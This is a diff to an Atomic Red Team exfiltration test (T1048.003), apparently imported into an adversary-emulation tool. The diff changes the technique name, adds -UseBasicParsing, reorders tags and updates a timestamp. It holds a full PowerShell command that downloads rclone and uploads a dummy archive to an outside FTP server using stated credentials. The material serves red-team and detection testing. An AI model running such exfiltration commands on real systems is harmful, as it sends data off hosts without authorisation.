@@ -7,8 +7,8 @@
   tactic: exfiltration
   technique:
     attack_id: T1048.003
-    name: 'Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated
-      Non-C2 Protocol'
+    name: 'Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2
+      Protocol'
   platforms:
     windows:
       psh:
@@ -16,16 +16,16 @@
           {exit 1}; then : ; else fsutil file createnew C:\Users\Public\Downloads\exfil.zip
           20485760; fi; if (Test-Path C:\Users\Public\Downloads\rclone-current-windows-amd64.zip)
           {exit 0} else {exit 1}; then : ; else Invoke-WebRequest -Uri "https://downloads.rclone.org/rclone-current-windows-amd64.zip"
-          -OutFile "C:\Users\Public\Downloads\rclone-current-windows-amd64.zip"; Expand-Archive
-          C:\Users\Public\Downloads\rclone-current-windows-amd64.zip -DestinationPath
-          C:\Users\Public\Downloads\; fi; $rclone_bin = Get-ChildItem C:\Users\Public\Downloads\
-          -Recurse -Include "rclone.exe" | Select-Object -ExpandProperty FullName;
-          $exfil_pack = Get-ChildItem C:\Users\Public\Downloads\ -Recurse -Include
-          "exfil.zip" | Select-Object -ExpandProperty FullName; &$rclone_bin config
-          create ftpserver "ftp" "host" ftp.dlptest.com "port" 21 "user" dlpuser "pass"
-          rNrKYTX9g7z3RgJRmxWuGHbeu; &$rclone_bin copy --max-age 2y $exfil_pack ftpserver
-          --bwlimit 2M -q --ignore-existing --auto-confirm --multi-thread-streams
-          12 --transfers 12 -P --ftp-no-check-certificate'
+          -OutFile "C:\Users\Public\Downloads\rclone-current-windows-amd64.zip" -UseBasicParsing;
+          Expand-Archive C:\Users\Public\Downloads\rclone-current-windows-amd64.zip
+          -DestinationPath C:\Users\Public\Downloads\; fi; $rclone_bin = Get-ChildItem
+          C:\Users\Public\Downloads\ -Recurse -Include "rclone.exe" | Select-Object
+          -ExpandProperty FullName; $exfil_pack = Get-ChildItem C:\Users\Public\Downloads\
+          -Recurse -Include "exfil.zip" | Select-Object -ExpandProperty FullName;
+          &$rclone_bin config create ftpserver "ftp" "host" ftp.dlptest.com "port"
+          21 "user" dlpuser "pass" rNrKYTX9g7z3RgJRmxWuGHbeu; &$rclone_bin copy --max-age
+          2y $exfil_pack ftpserver --bwlimit 2M -q --ignore-existing --auto-confirm
+          --multi-thread-streams 12 --transfers 12 -P --ftp-no-check-certificate'
         elevation_required: true
   plugin: atomic
   singleton: false
@@ -33,9 +33,9 @@
   delete_payload: false
   privilege: ''
   buckets:
-  - t1048.003
-  - atomic-red-team
   - exfiltration
+  - atomic-red-team
+  - t1048.003
   author: Atomic Red Team
   additional_info:
     input_arguments:
@@ -73,7 +73,7 @@
 
         '
       get_prereq_command: 'Invoke-WebRequest -Uri "https://downloads.rclone.org/rclone-current-windows-amd64.zip"
-        -OutFile "C:\Users\Public\Downloads\rclone-current-windows-amd64.zip"
+        -OutFile "C:\Users\Public\Downloads\rclone-current-windows-amd64.zip" -UseBasicParsing
 
         Expand-Archive C:\Users\Public\Downloads\rclone-current-windows-amd64.zip
         -DestinationPath C:\Users\Public\Downloads\
@@ -81,4 +81,4 @@
         '
     technique_created: '2020-03-15T15:37:47.583Z'
     atomic_guid: b854eb97-bf9b-45ab-a1b5-b94e4880c56b
-    import_timestamp: '2026-10-20T07:08:31.147000Z'
+    import_timestamp: '2026-10-21T07:01:52.919698Z'
